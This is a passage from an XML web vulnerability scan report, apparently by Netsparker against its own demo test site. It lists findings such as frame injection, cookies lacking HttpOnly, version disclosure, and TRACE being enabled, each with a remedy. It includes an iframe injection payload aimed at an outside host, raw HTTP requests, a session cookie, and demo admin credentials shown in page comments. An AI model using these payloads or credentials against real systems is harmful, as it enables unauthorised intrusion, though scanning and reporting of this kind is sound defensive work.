					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://www.owasp.org/index.php/Cross_Frame_Scripting&#39;&gt;OWASP - Cross Frame Scripting&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
					<remedyReferences><![CDATA[  ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

						<vulnerableparametertype>GET</vulnerableparametertype>
						<vulnerableparameter>name</vulnerableparameter>
						<vulnerableparametervalue>&amp;lt;iframe src=&amp;quot;http://r87.com/?&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;</vulnerableparametervalue>
					<rawrequest>&lt;![CDATA[GET /hello.php?name=%3ciframe%20src%3d%22http%3a%2f%2fr87.com%2f%3f%22%3e%3c%2fiframe%3e HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Cookie: PHPSESSID=cc357e5fc0d8f52676e059eed885e5be
Referer: http://php.testsparker.com/process.php?file=Generics/index.nsp
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[
â€¦&lt;/br&gt;h1&gt;
					&lt;p&gt;
                    Hello Visitor&lt;br /&gt;
&lt;b&gt;Parse error&lt;/b&gt;:  syntax error, unexpected T_STRING in &lt;b&gt;C:\AppServ\www\hello.php(24) : eval()&#39;d code&lt;/b&gt; on line &lt;b&gt;1&lt;/b&gt;&lt;br /&gt;
20$str = 20 &lt;span class=&quot;highlight&quot;&gt;&lt;iframe src=&quot;http://r87.com/?&quot;&gt;&lt;/iframe&gt;&lt;/span&gt;;20                    &lt;/p&gt;

				&lt;div style=&quot;clear: both;&quot;&gt;&amp;nbsp;&lt;/div&gt;
				&lt;div class=&quot;entry&quot;&gt;


				&lt;/div&gt;
			&lt;/div&gt;
		&lt;div style=&quot;clear: both;&quot;&gt;&amp;nbsp;&lt;/div&gt;
		&lt;/div&gt;
		&lt;!-- end #content -
â€¦&lt;/br&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013>A10</OWASP2013>
							<WASC>38</WASC>
							<CWE>601</CWE>
							<CAPEC></CAPEC>
							<PCI31>6.5.1</PCI31>
							<PCI32>6.5.1</PCI32>
							<HIPAA>164.308(a)</HIPAA>
							<OWASPPC></OWASPPC>

								<CVSS>
									<vector>CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N</vector>

									<score>
										<type>Base</type>
										<value>4.7</value>
										<severity>Medium</severity>
									</score>
									<score>
										<type>Temporal</type>
										<value>4.7</value>
										<severity>Medium</severity>
									</score>
									<score>
										<type>Environmental</type>
										<value>4.7</value>
										<severity>Medium</severity>
									</score>

								</CVSS>
						</classification>

				</vulnerability>
				<vulnerability confirmed="True">
					<url>http://php.testsparker.com/auth/login.php</url>
					<type>AutoCompleteEnabled</type>
					<severity>Low</severity>
					<certainty>100</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker detected that autocomplete is enabled in one or more of the form fields which might contain sensitive information like &quot;username&quot;, &quot;credit card&quot; or &quot;CVV&quot;.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;p&gt;If user chooses to save, data entered in these fields will be cached by the browser. An attacker who can access the victim&#39;s browser could steal this information. This is especially important if the application is commonly used in shared computers, such as cyber cafes or airport terminals.&lt;/p&gt; ]]></impact>
					<actionsToTake><![CDATA[ &lt;div&gt;&lt;ol&gt;&lt;li&gt;Add the attribute &lt;code&gt;autocomplete=&quot;off&quot;&lt;/code&gt; to the form tag or to individual &quot;input&quot; fields.&lt;/li&gt;&lt;li&gt;Find all instances of inputs that store private data and disable autocomplete. Fields which contain data such as &quot;Credit Card&quot; or &quot;CCV&quot; type data should not be cached. You can allow the application to cache usernames and remember passwords; however, in most cases this is not recommended.&lt;/li&gt;&lt;li&gt;Re-scan the application after addressing the identified issues to ensure all of the fixes have been applied properly.&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt; ]]></actionsToTake>
					<remedy><![CDATA[  ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[ &lt;div&gt;First and foremost, attacker needs either physical access or user-level code execution rights for successful exploitation. Dumping all data from a browser can be fairly easy, and a number of automated tools exist to undertake this. Where the attacker cannot dump the data, he/she could still browse the recently visited websites and activate the autocomplete feature to see previously entered values.&lt;/div&gt; ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://msdn.microsoft.com/en-us/library/ms533032(VS.85).aspx&#39;&gt;Using Autocomplete in HTML Forms&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
					<remedyReferences><![CDATA[  ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

					<rawrequest>&lt;![CDATA[GET /auth/login.php HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Referer: http://php.testsparker.com/auth/
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[
â€¦&lt;/br&gt;h1 class=&quot;title&quot;&gt;&lt;a href=&quot;#&quot;&gt;Login Area&lt;/a&gt;&lt;/h1&gt;
					&lt;p&gt;
                    Enter your credentials (admin / admin123456)
    &lt;br/&gt;
    &lt;form method=&quot;POST&quot; action=&quot;control.php&quot;&gt;
      Username: &lt;span class=&quot;highlight&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot;/&gt;&lt;/span&gt;
      &lt;br/&gt;
      Password:&amp;nbsp;&amp;nbsp;&lt;input type=&quot;password&quot; name=&quot;password&quot;/&gt;
&lt;!-- Test credentials --&gt;
&lt;!-- Password: admin123456 --&gt;
      &lt;br/&gt;
      &lt;br/&gt;
      &lt;input type=&quot;submit&quot; valu
â€¦&lt;/br&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
							<info name="Identified Field Name">&lt;![CDATA[username]]&gt;</info>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013>A5</OWASP2013>
							<WASC>15</WASC>
							<CWE>16</CWE>
							<CAPEC></CAPEC>
							<PCI31></PCI31>
							<PCI32></PCI32>
							<HIPAA></HIPAA>
							<OWASPPC></OWASPPC>

						</classification>

				</vulnerability>
				<vulnerability confirmed="True">
					<url>http://php.testsparker.com/auth/login.php</url>
					<type>CookieNotMarkedAsHttpOnly</type>
					<severity>Low</severity>
					<certainty>100</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker identified a cookie not marked as HTTPOnly.&lt;/p&gt;&lt;p&gt;HTTPOnly cookies cannot be read by client-side scripts, therefore marking a cookie as HTTPOnly can provide an additional layer of protection against cross-site scripting attacks.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;During a cross-site scripting attack, an attacker might easily access cookies and hijack the victim&#39;s session.&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[ &lt;div&gt;&lt;ol&gt;&lt;li&gt;See the remedy for solution.&lt;/li&gt;&lt;li&gt;Consider marking all of the cookies used by the application as HTTPOnly. (&lt;em&gt;After these changes javascript code will not be able to read cookies.&lt;/em&gt;)&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt; ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;Mark the cookie as HTTPOnly. This will be an extra layer of defense against XSS. However this is not a silver bullet and will not protect the system against cross-site scripting attacks. An attacker can use a tool such as &lt;a href=&quot;https://labs.portcullis.co.uk/tools/xss-tunnel/&quot; data-mce-href=&quot;https://labs.portcullis.co.uk/tools/xss-tunnel/&quot;&gt;XSS Tunnel&lt;/a&gt; to bypass HTTPOnly protection.&lt;/div&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://www.owasp.org/index.php/HTTPOnly&#39;&gt;OWASP HTTPOnly Cookies&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://msdn.microsoft.com/en-us/library/system.web.httpcookie.httponly%28VS.80%29.aspx&#39;&gt;MSDN - ASP.NET HTTPOnly Cookies&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
					<remedyReferences><![CDATA[  ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

					<rawrequest>&lt;![CDATA[GET /auth/login.php HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Referer: http://php.testsparker.com/auth/
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[HTTP/1.1 200 OK
&lt;span class=&quot;highlight&quot;&gt;Set-Cookie: PHPSESSID=cc357e5fc0d8f52676e059eed885e5be; path=/
&lt;/span&gt;
Server: Apache/2.2.8 (Win32) PHP/5.2.6
X-Powered-By: PHP/5.2.6
Pragma: no-cache
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Content-Length: 3117
Content-Type: text/html
Date: Fri, 29 Jun 2018 03:09:
â€¦&lt;/br&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
							<info name="Identified Cookie(s)">&lt;![CDATA[PHPSESSID]]&gt;</info>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013>A5</OWASP2013>
							<WASC>15</WASC>
							<CWE>16</CWE>
							<CAPEC>107</CAPEC>
							<PCI31></PCI31>
							<PCI32></PCI32>
							<HIPAA></HIPAA>
							<OWASPPC></OWASPPC>

						</classification>

				</vulnerability>
				<vulnerability confirmed="False">
					<url>http://php.testsparker.com/</url>
					<type>ApacheVersionDisclosure</type>
					<severity>Low</severity>
					<certainty>90</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker identified a version disclosure (Apache) in the target web server&#39;s HTTP response.&lt;/p&gt;&lt;p&gt;This information might help an attacker gain a greater understanding of the systems in use and potentially develop further attacks targeted at the specific version of Apache.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;An attacker might use the disclosed information to harvest specific security vulnerabilities for the version identified.&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[  ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;Configure your web server to prevent information leakage from the &lt;code&gt;SERVER&lt;/code&gt; header of its HTTP response.&lt;/div&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[  ]]></externalReferences>
					<remedyReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://httpd.apache.org/docs/2.2/mod/core.html#servertokens&#39;&gt;Apache ServerTokens Directive&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

					<rawrequest>&lt;![CDATA[GET / HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[HTTP/1.1 200 OK
&lt;span class=&quot;highlight&quot;&gt;Server: Apache/2.2.8 (Win32) PHP/5.2.6
&lt;/span&gt;
X-Powered-By: PHP/5.2.6
Content-Length: 144
Content-Type: text/html
Date: Fri, 29 Jun 2018 03:09:14 GMT

&lt;html&gt;
&lt;HEAD&gt;
&lt;SCRIPT language=&quot;JavaScript&quot;&gt;
&lt;!--
window.location=&quot;process.php?file=Generics/index.nsp&quot;;
//--&gt;
&lt;/SCRIPT&gt;
&lt;/HEAD&gt;
&lt;/html&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
							<info name="ExtractedVersion">&lt;![CDATA[2.2.8]]&gt;</info>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013></OWASP2013>
							<WASC>45</WASC>
							<CWE>205</CWE>
							<CAPEC>170</CAPEC>
							<PCI31></PCI31>
							<PCI32></PCI32>
							<HIPAA>164.306(a), 164.308(a)</HIPAA>
							<OWASPPC></OWASPPC>

						</classification>

				</vulnerability>
				<vulnerability confirmed="False">
					<url>http://php.testsparker.com/</url>
					<type>PhpVersionDisclosure</type>
					<severity>Low</severity>
					<certainty>90</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker identified a version disclosure (PHP) in target web server&#39;s HTTP response.&lt;/p&gt;&lt;p&gt;This information can help an attacker gain a greater understanding of the systems in use and potentially develop further attacks targeted at the specific version of PHP.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;An attacker might use the disclosed information to harvest specific security vulnerabilities for the version identified.&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[  ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;Configure your web server to prevent information leakage from the &lt;code&gt;SERVER&lt;/code&gt; header of its HTTP response.&lt;/div&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[  ]]></externalReferences>
					<remedyReferences><![CDATA[  ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

					<rawrequest>&lt;![CDATA[GET / HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[HTTP/1.1 200 OK
&lt;span class=&quot;highlight&quot;&gt;Server: Apache/2.2.8 (Win32) PHP/5.2.6
&lt;/span&gt;
X-Powered-By: PHP/5.2.6
Content-Length: 144
Content-Type: text/html
Date: Fri, 29 Jun 2018 03:09:14 GMT

&lt;html&gt;
&lt;HEAD&gt;
&lt;SCRIPT language=&quot;JavaScript&quot;&gt;
&lt;!--
window.location=&quot;process.php?file=Generics/index.nsp&quot;;
//--&gt;
&lt;/SCRIPT&gt;
&lt;/HEAD&gt;
&lt;/html&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
							<info name="ExtractedVersion">&lt;![CDATA[5.2.6]]&gt;</info>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013></OWASP2013>
							<WASC>45</WASC>
							<CWE>205</CWE>
							<CAPEC>170</CAPEC>
							<PCI31></PCI31>
							<PCI32></PCI32>
							<HIPAA>164.306(a), 164.308(a)</HIPAA>
							<OWASPPC></OWASPPC>

						</classification>

				</vulnerability>
				<vulnerability confirmed="False">
					<url>http://php.testsparker.com/hello.php?name=Visitor</url>
					<type>ProgrammingErrorMessages</type>
					<severity>Low</severity>
					<certainty>90</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker identified a programming error message.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;The error message may disclose sensitive information and this information can be used by an attacker to mount new attacks or to enlarge the attack surface. Source code, stack trace, etc. data may be disclosed. Most of these issues will be identified and reported separately by Netsparker.&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[  ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;Do not provide error messages on production environments. Save error messages with a reference number to a backend storage such as a log, text file or database, then show this number and a static user-friendly error message to the user.&lt;/div&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[  ]]></externalReferences>
					<remedyReferences><![CDATA[  ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

					<rawrequest>&lt;![CDATA[GET /hello.php?name=Visitor HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Referer: http://php.testsparker.com/process.php?file=Generics/index.nsp
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[
â€¦&lt;/br&gt;id=&quot;page-bgtop&quot;&gt;
	&lt;div id=&quot;page-bgbtm&quot;&gt;
		&lt;div id=&quot;content&quot;&gt;
			&lt;div class=&quot;post&quot;&gt;
								&lt;h1 class=&quot;title&quot;&gt;&lt;a href=&quot;#&quot;&gt;Hello Service &lt;/a&gt;&lt;/h1&gt;
					&lt;p&gt;
                    Hello Visitor&lt;br /&gt;
&lt;span class=&quot;highlight&quot;&gt;&lt;b&gt;Parse error&lt;/b&gt;:  syntax error, unexpected T_STRING in &lt;b&gt;C:\AppServ\www\hello.php(24) : eval()&#39;d code&lt;/b&gt; on line &lt;b&gt;1&lt;/b&gt;&lt;/span&gt;&lt;br /&gt;
20$str = 20 Visitor;20                    &lt;/p&gt;

				&lt;div style=&quot;clear: both;&quot;&gt;&amp;nbsp;&lt;/div&gt;
				&lt;div class=&quot;entry&quot;&gt;


				&lt;/div&gt;
			&lt;/div&gt;
		&lt;div style=&quot;clear: both;&quot;&gt;&amp;nbsp;&lt;/div&gt;
		&lt;/d
â€¦&lt;/br&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
							<info name="IdentifiedErrorMessage">&lt;![CDATA[&lt;b&gt;Parse error&lt;/b&gt;:  syntax error, unexpected T_STRING in &lt;b&gt;C:\AppServ\www\hello.php(24) : eval()&#39;d code&lt;/b&gt; on line &lt;b&gt;1&lt;/b&gt;]]&gt;</info>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013>A5</OWASP2013>
							<WASC>13</WASC>
							<CWE>210</CWE>
							<CAPEC>118</CAPEC>
							<PCI31>6.5.5</PCI31>
							<PCI32>6.5.5</PCI32>
							<HIPAA>164.306(a), 164.308(a)</HIPAA>
							<OWASPPC></OWASPPC>

						</classification>

				</vulnerability>
				<vulnerability confirmed="False">
					<url>http://php.testsparker.com/index</url>
					<type>ApacheMultiViewsEnabled</type>
					<severity>Low</severity>
					<certainty>90</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker detected that Apache MultiViews is enabled.&lt;/p&gt;&lt;p&gt;This vulnerability can be used for locating and obtaining access to some hidden resources.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;&lt;div&gt;An attacker can use this functionality to aid in finding hidden files in the site and potentially gather further sensitive information.&lt;/div&gt;&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[ &lt;div&gt;&lt;ol&gt;&lt;li&gt;&lt;p&gt;Change your server configuration file. A recommended configuration for the requested directory should be in the following format:&lt;/p&gt;&lt;pre class=&quot;xml code&quot;&gt;&amp;lt;Directory /{YOUR DIRECTORY}&amp;gt;
	Options FollowSymLinks
&amp;lt;/Directory&amp;gt;
&lt;/pre&gt;&lt;p&gt;Remove the &lt;em&gt;MultiViews&lt;/em&gt; option from configuration.&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt; ]]></actionsToTake>
					<remedy><![CDATA[  ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[  ]]></externalReferences>
					<remedyReferences><![CDATA[  ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

					<rawrequest>&lt;![CDATA[HEAD /index HTTP/1.1
Host: php.testsparker.com
Accept: netsparker/check
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[HTTP/1.1 406 Not Acceptable
Server: Apache/2.2.8 (Win32) PHP/5.2.6
TCN: list
&lt;span class=&quot;highlight&quot;&gt;Alternates:&lt;/span&gt; {&quot;index.php&quot; 1 {type application/x-httpd-php} {length 144}}
Content-Type: text/html; charset=iso-8859-1
Date: Fri, 29 Jun 2018 03:09:24 GMT
Vary: negotiate

]]&gt;
				    </rawresponse>
					<extrainformation>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013>A5</OWASP2013>
							<WASC>14</WASC>
							<CWE>16</CWE>
							<CAPEC></CAPEC>
							<PCI31></PCI31>
							<PCI32></PCI32>
							<HIPAA></HIPAA>
							<OWASPPC></OWASPPC>

						</classification>

				</vulnerability>
				<vulnerability confirmed="False">
					<url>http://php.testsparker.com/</url>
					<type>TraceTrackIdentified</type>
					<severity>Low</severity>
					<certainty>100</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker detected the TRACE/TRACK method is allowed.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;It is possible to bypass the HttpOnly cookie limitation and read the cookies in a cross-site scripting attack by using the TRACE/TRACK method within an XmlHttpRequest. This is not possible with modern browsers, so the vulnerability can only be used when targeting users with unpatched and old browsers.&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[  ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;Disable this method in all production systems. Even though the application is not vulnerable to cross-site scripting, a debugging feature such as TRACE/TRACK should not be required in a production system and therefore should be disabled.&lt;/div&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;http://www.cgisecurity.com/lib/WH-WhitePaper_XST_ebook.pdf&#39;&gt;Cross Site Tracing&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://www.kb.cert.org/vuls/id/867593&#39;&gt;US-CERT VU#867593&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
					<remedyReferences><![CDATA[  ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

					<rawrequest>&lt;![CDATA[TRACE / HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Content-Length: 0
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-NS: N7039928S
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[HTTP/1.1 200 OK
Server: Apache/2.2.8 (Win32) PHP/5.2.6
&lt;span class=&quot;highlight&quot;&gt;Content-Type: message/http&lt;/span&gt;
Transfer-Encoding: chunked
Date: Fri, 29 Jun 2018 03:09:46 GMT

TRACE / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-NS: N7039928S
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Host: php.testsparker.com
Content-Length: 0
Accept-Encoding: gzip, deflate

]]&gt;
				    </rawresponse>
					<extrainformation>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013>A5</OWASP2013>
							<WASC>14</WASC>
							<CWE>16</CWE>
							<CAPEC>107</CAPEC>
							<PCI31></PCI31>
							<PCI32></PCI32>
							<HIPAA></HIPAA>
							<OWASPPC></OWASPPC>

						</classification>

				</vulnerability>
				<vulnerability confirmed="True">
					<url>http://php.testsparker.com/process.php?file=Generics/contact.nsp</url>
					<type>InsecureFrameExternal</type>
					<severity>Low</severity>
					<certainty>100</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker identified an external insecure or misconfigured iframe.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;&lt;p&gt;IFrame sandboxing enables a set of extra restrictions for the content in the inline frame.&lt;/p&gt;&lt;strong&gt;Same Origin&lt;/strong&gt; policy allows one window to access properties/functions of another one only if they come from the same protocol, the same port and also the same domain.&lt;pre&gt;
&lt;strong&gt;URLs from the same origin:&lt;/strong&gt;

http://site.com
http://site.com/
http://site.com/my/page.html

&lt;strong&gt;URLs not from the same origin:&lt;/strong&gt;

http://www.site.com  (sub domain)
http://site.org      (different domain)
https://site.com     (different protocol)
http://site.com:8080 (different port)
    &lt;/pre&gt;&lt;p&gt;When the &lt;code&gt;sandbox&lt;/code&gt; attribute is set, the iframe content is treated as being from a unique origin and sandboxed content is re-hosted in the browser with the following restrictions:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Plugins are disabled. Any kind of ActiveX, Flash, or Silverlight plugin will not be executed.&lt;/li&gt;&lt;li&gt;Forms are disabled. The hosted content is not allowed to make forms post back to any target.&lt;/li&gt;&lt;li&gt;Scripts are disabled. JavaScript is disabled and will not execute.&lt;/li&gt;&lt;li&gt;Links to other browsing contexts are disabled. An anchor tag targeting different browser levels will not execute.&lt;/li&gt;&lt;li&gt;Unique origin treatment. All content is treated under a unique origin. The content is not able to traverse the DOM or read cookie information.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;When not set or misconfigured &lt;code&gt;sandbox&lt;/code&gt; or &lt;code&gt;seamless&lt;/code&gt; attribute of an iframe for an untrusted URL:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Compromised website in the iframe might affect the users in parent web application.&lt;/li&gt;&lt;li&gt;Sandbox containing a value of :&lt;ul&gt;&lt;li&gt;&lt;code&gt;allow-same-origin&lt;/code&gt; will not force the unique origin for iframe contents.&lt;/li&gt;&lt;li&gt;&lt;code&gt;allow-top-navigation&lt;/code&gt; will allow iframe to navigate parent context, e.g. change &lt;code&gt;parent.location&lt;/code&gt;.&lt;/li&gt;&lt;li&gt;&lt;code&gt;allow-forms&lt;/code&gt; will allow forms submissions from inside iframe.&lt;/li&gt;&lt;li&gt;&lt;code&gt;allow-popups&lt;/code&gt; will allow popups.&lt;/li&gt;&lt;li&gt;&lt;code&gt;allow-scripts&lt;/code&gt; will allow malicious script execution however still disallow to create popups.&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;li&gt;If &lt;code&gt;seamless&lt;/code&gt; attribute is set, links within the iframe will navigate the parent frame.&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[  ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;Apply sandboxing in inline frame&lt;pre&gt;&amp;lt;iframe sandbox src=&quot;framed-page-url&quot;&amp;gt;&amp;lt;/iframe&amp;gt;
&lt;/pre&gt;&lt;/li&gt;&lt;li&gt;For untrusted content, avoid the usage of &lt;code&gt;seamless&lt;/code&gt; attribute and &lt;code&gt;allow-top-navigation&lt;/code&gt;, &lt;code&gt;allow-popups&lt;/code&gt; and &lt;code&gt;allow-scripts&lt;/code&gt; in sandbox attribute.&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://www.owasp.org/index.php/HTML5_Security_Cheat_Sheet&#39;&gt;HTML5 Security Cheat Sheet&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
					<remedyReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://msdn.microsoft.com/en-us/hh563496.aspx&#39;&gt;How to Safeguard your Site with HTML5 Sandbox&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://www.html5rocks.com/en/tutorials/security/sandboxed-iframes/&#39;&gt;Play safely in sandboxed IFrames&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

